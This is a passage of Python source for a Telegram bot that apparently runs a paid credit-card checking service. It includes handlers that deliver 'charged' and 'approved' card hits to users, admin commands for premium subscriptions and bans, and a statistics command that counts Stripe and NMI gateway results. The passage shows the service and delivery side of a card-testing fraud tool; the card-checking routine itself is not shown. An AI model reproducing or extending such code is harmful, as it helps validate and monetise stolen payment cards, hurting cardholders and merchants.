@bot.callback_query_handler(func=lambda c: c.data == "none")
def cb_none(call):
    try: bot.answer_callback_query(call.id)
    except: pass

@bot.callback_query_handler(func=lambda c: c.data.startswith("get_charged_") or c.data.startswith("get_approved_"))
def cb_get_hits(call):
    try: bot.answer_callback_query(call.id)
    except: pass
    
    data = call.data
    job_id = data.split("_")[-1] 
    
    if job_id not in LIVE_HITS:
        bot.send_message(call.message.chat.id, f"{WARN} {bold_capitalize('No hits found or session expired')}", parse_mode="HTML")
        return
        
    if data.startswith("get_charged_"):
        hits = LIVE_HITS[job_id].get("charged", [])
        title = "CHARGED CARDS"
    else:
        hits = LIVE_HITS[job_id].get("approved", [])
        title = "APPROVED CARDS"
        
    if not hits:
        bot.send_message(call.message.chat.id, f"{WARN} {bold_capitalize('No cards found for this category yet')}", parse_mode="HTML")
        return
        
    msg_text = f"✦ {bold_capitalize(title)} ✦\n{HLINE*20}\n"
    for card in hits:
        msg_text += f"<code>{card}</code>\n"
    
    msg_text += f"{HLINE*20}\n✦ {bold_capitalize('Total')} : {len(hits)} ✦"
    
    if len(msg_text) > 4000:
        chunks = [msg_text[i:i+4000] for i in range(0, len(msg_text), 4000)]
        for chunk in chunks:
            bot.send_message(call.message.chat.id, chunk, parse_mode="HTML")
            time.sleep(0.5)
    else:
        bot.send_message(call.message.chat.id, msg_text, parse_mode="HTML")

@bot.callback_query_handler(func=lambda c: c.data.startswith("stop_"))
def cb_stop(call):
    try: bot.answer_callback_query(call.id, "Stopping...")
    except: pass
    jid = call.data[5:]
    if jid in ACTIVE_JOBS: ACTIVE_JOBS[jid] = False

@bot.message_handler(commands=['addpremium'])
def add_prem(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, bold("Admin only"), parse_mode="HTML")
        return
    try:
        parts = message.text.split()
        target_id = parts[1]
        duration = parts[2]
        now = time.time()
        if duration == 'lifetime': exp = 0
        elif duration.endswith('s'): exp = now + int(duration[:-1])
        elif duration.endswith('m'): exp = now + int(duration[:-1]) * 60
        elif duration.endswith('h'): exp = now + int(duration[:-1]) * 3600
        elif duration.endswith('d'): exp = now + int(duration[:-1]) * 86400
        else: raise Exception()
        with open(PREMIUM_FILE, 'a') as f:
            f.write(f"{target_id}|{exp}\n")
        bot.reply_to(message, f"{bold('Premium added')}: {target_id}", parse_mode="HTML")
    except:
        bot.reply_to(message, bold("Usage:") + " /addpremium <userid> <duration>", parse_mode="HTML")

@bot.message_handler(commands=['rmpremium'])
def rm_prem(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, bold("Admin only"), parse_mode="HTML")
        return
    try:
        target_id = message.text.split()[1]
        with open(PREMIUM_FILE, 'r') as f: lines = f.readlines()
        with open(PREMIUM_FILE, 'w') as f:
            for l in lines:
                if target_id not in l: f.write(l)
        bot.reply_to(message, f"{bold('Premium removed')}: {target_id}", parse_mode="HTML")
    except:
        bot.reply_to(message, bold("Usage:") + " /rmpremium <userid>", parse_mode="HTML")

@bot.message_handler(commands=['ban'])
def ban_user(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, bold("Admin only"), parse_mode="HTML")
        return
    try:
        parts = message.text.split()
        target_id = parts[1]
        duration = parts[2] if len(parts) > 2 else 'lifetime'
        now = time.time()
        if duration == 'lifetime': exp = 0
        elif duration.endswith('s'): exp = now + int(duration[:-1])
        elif duration.endswith('m'): exp = now + int(duration[:-1]) * 60
        elif duration.endswith('h'): exp = now + int(duration[:-1]) * 3600
        elif duration.endswith('d'): exp = now + int(duration[:-1]) * 86400
        else: raise Exception()
        with open(BANNED_FILE, 'a') as f:
            f.write(f"{target_id}|{exp}\n")
        bot.reply_to(message, f"{bold('Banned')}: {target_id}", parse_mode="HTML")
    except:
        bot.reply_to(message, bold("Usage:") + " /ban <userid> <duration>", parse_mode="HTML")

@bot.message_handler(commands=['unban'])
def unban_user(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, bold("Admin only"), parse_mode="HTML")
        return
    try:
        target_id = message.text.split()[1]
        with open(BANNED_FILE, 'r') as f: lines = f.readlines()
        with open(BANNED_FILE, 'w') as f:
            for l in lines:
                if target_id not in l: f.write(l)
        bot.reply_to(message, f"{bold('Unbanned')}: {target_id}", parse_mode="HTML")
    except:
        bot.reply_to(message, bold("Usage:") + " /unban <userid>", parse_mode="HTML")

@bot.message_handler(commands=['info'])
def user_info(message):
    target_id = str(message.from_user.id)
    role = f"[{bold('ADMIN')}]" if is_admin(int(target_id)) else (f"[{bold('PREMIUM')}]" if is_premium(int(target_id)) else f"[{bold('FREE')}]")
    used, daily, _, _ = get_user_limit(int(target_id))
    daily_text = bold("Unlimited") if daily == 0 else f"{daily}"
    bot.reply_to(message, f"{bold('ID')}: {target_id}\n{bold('Rank')}: {role}\n{bold('Daily')}: {used}/{daily_text}", parse_mode="HTML")

@bot.message_handler(commands=['stats'])
def bot_stats(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, bold("Admin only"), parse_mode="HTML")
        return
    s = get_stats()
    bot.reply_to(message, f"{bold('Stripe Approved')}: {s.get('approved', 0)}\n{bold('Stripe 3DS')}: {s.get('3ds', 0)}\n{bold('NMI Charged')}: {s.get('nmi_charged', 0)}\n{bold('NMI Declined')}: {s.get('nmi_declined', 0)}\n{bold('Total Users')}: {s.get('total_users', 0)}", parse_mode="HTML")

if __name__ == "__main__":
    print("BOT IS RUNNING...")
    while True:
        try:
            bot.polling(none_stop=True, timeout=60)
        except:
            time.sleep(5)
